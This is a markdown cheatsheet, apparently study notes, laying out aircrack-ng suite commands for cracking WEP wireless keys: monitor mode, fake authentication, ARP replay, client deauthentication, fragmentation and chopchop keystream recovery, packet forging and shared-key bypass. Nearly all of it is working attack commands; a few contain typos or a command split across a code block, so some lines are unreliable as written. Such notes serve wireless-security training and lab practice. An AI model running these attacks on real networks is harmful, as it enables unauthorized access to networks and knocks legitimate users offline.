# WEP CRACKING CHEATSHEET

## WEP(attacking the AP which has a client):

1. Put card in monitor mode: 
```
airmon-ng start wlan1 <channel>
```
2. Start airo-dump on the channel with mac filter 
```
airodump-ng -c <channel> -w <o/p file>  --bssid <mac of AP> wlan1mon
```
3. fake auth
```
aireplay-ng  -1  0  -a <AP mac>  -e <SSID of AP>  -h <alpha card mac> wlan1mon
```
4. arp req replay
```
aireplay-ng -3 -b <AP mac> -h <alpha card mac> wlan1mon
```

5. Then if needed do a deauth 
```
aireplay-ng -0 1 -a <AP mac> -c <target mac> wlan1mon
```

6. Once data packets are high, crack wep:
```
aircrack-ng -0 <pcap file>  (PTW METHOD)
aircrack-ng  <pcap file> -w <wordlist> 
``` 
(if wordlist has correct pwd, then number of data packets should not matter coz the mode of cracking is diff)


## WEP CRACKING (attacking the Client)

This uses the interactive packet replay attack

1. card in monitor mode: 
```
airmon-ng start wlan1 <channel>
```

2. start airo-dump on the channel with mac filter 
```
airodump-ng -c <channel> -w <o/p file>  --bssid <mac of AP> wlan1mon
```

3. fake auth
```
aireplay-ng  -1  0  -a <AP mac>  -e <SSID of AP>  -h <alpha card mac> wlan1mon
```

4. Interactive packet replay attack (choose specific packet)
```
aireplay-ng  -2  -b <ap mac>  -d FF:FF:FF:FF:FF:FF   -f 1   -m 68 -n 86 wlan1mon
```
This will generate the data packets that are needed to crack the key

5. Crack password: 
```
aircrack-ng -0 -z -n 64 <pcap file>
```

## WEP CRACKING (clientless WEP)

This uses the korek chop chop and fragmentation attack. Use either korek or frag to get the xor file. use packetforge to forge a arp req, then use the arp-req-replay

#### Fragmentation attack:

1. Put card in monitor mode: 
```
airmon-ng start wlan1 <channel>
```

2. Start airo-dump on the channel with mac filter 
```
airodump-ng -c <channel> -w <o/p file>  --bssid <mac of AP> wlan1mon
```
3. Fake auth
```
aireplay-ng  -1  60  -a <AP mac>  -e <SSID of AP>  -h <alpha card mac> wlan1mon
-60
```
 =>  an association timing so it stays connected to the AP (Every 60 seconds aireplay will do fake auth)

4. Fragmentation attack: (same syntax for korek chop chop with -4 instead of -5)
```
aireplay-ng -5 -b <AP mac> -h <alpha card mac> wlan1mon
```
 - fragmentation attack collects PRGA key stream which can be used with packetforge to generate new data packets which can be used to generate packets for injection attacks (requires atleast one data packet from AP)
- This will collect packets and ask if you want to use a certain packet. Then it will generate arp packet from small data packet, send it to AP, get the response which has more data packets and so on... until it generates 1500bytes of keystream.
- It will store this file on disk. (it will be a .xor file)

5. Packetforge-ng (create an encrypted arp request)
```
packetforge-ne -0  -a <AP mac> -h <alpha mac> -l 192.168.1.100 
```
-k 192.168.1.255 -y <prga xor file> -w <o/p file name> 
-0  => ARP packet
-h  should have the source mac address. our alpha card is associated to AP so we use it
-l => source IP (any ip on network)
-k => destination address (any ip on network that does not exist)(use local broadcarst addr)

Check file : 
```
tcpdump -n -vvv -e -s0 -r <o/p file from above>

aireplay-ng -2 -r <o/p file from packetforge>
```
- this is using aireplay's interactive packet replay attack to inject the newly created arp packet into the network to create more data
- Once this is done, data packets number should increaseeee
then you can use aircrack to crack key

6. Korek Chop Chop Attack (does not work on dlink)(may work where frag attack does not)
```
aireplay-ng -4 -b <ap mac> -h <alpha mac> wlan1mon
```
- Syntax is same as the fragmentation attack except it is -4 instead of -5
- This will save unencrypted packet and prga stream (cap file and xor file) (or will error out)

7. check the packet:
```
tcpdump -s 0 -n -e -r <captured cap file>
```
This will have ip scheme for the network.

8. Use this information with packetforge-ng to create packet
```
packetforge-ng -a <ap mac> -h <alpha mac> -l <src ip> -k <dst ip> -y <prga file> -w <o/p file>
```
9. Inject this using aireplay-ng
```
aireplay-ng -2 -r <filename> wlan1mon
```

10. Crack using aircrack-ng


## WEP CRACKING (SHARED KEY AUTH)

we need to capture a prga file as a client authenticates to the network

1. Put card in monitor mode
```
airmon-ng start 6
```

2. Start packet capture
```
airodump-ng -c 6 --bssid <ap mac> -w <o/p file name> wlan1mon
```

3. Fake auth:
```
aireplay-ng -1 0 -a <AP MAC> -h <alpha mac> wlan1mon
```
In the o/p , there is a msg stating changing to ska from open auth and then it fails. 'auth' section of airodump capture changes to shared key auth and fails. Top right section of airodump  you see 'broken ska'

3. Deauth
- The auth column will not display 'SKA' untill some client authenticates
- Speed this up by sending an unauth attac:
```
aireply-ng -0 1 -a <ap mac> -c <victim mac> wlan1mon
```
- After reauth 'ska will be displayed' plus the directory listing will contain a xor file
using this prga file , conduct a fake auth
```
aireplay-ng -1 60 -a <AP mac> -e <essid> -y <prga filename> -h <alpha mac> wlan1mon
```

fake auth works

=>arp req replay attack
```
aireplay-ng -3 -b <ap mac> -h <alpha mac> wlan1mon
```
instead of waiting for arp packet to turn in, run another deauth attack
```
aireplay-ng  -0 1 -a <ap mac> -c <vic mac> wlan1mon
```
crack wep key
```
aircrack-ng -0 -z -n 64 <pcap file> 
```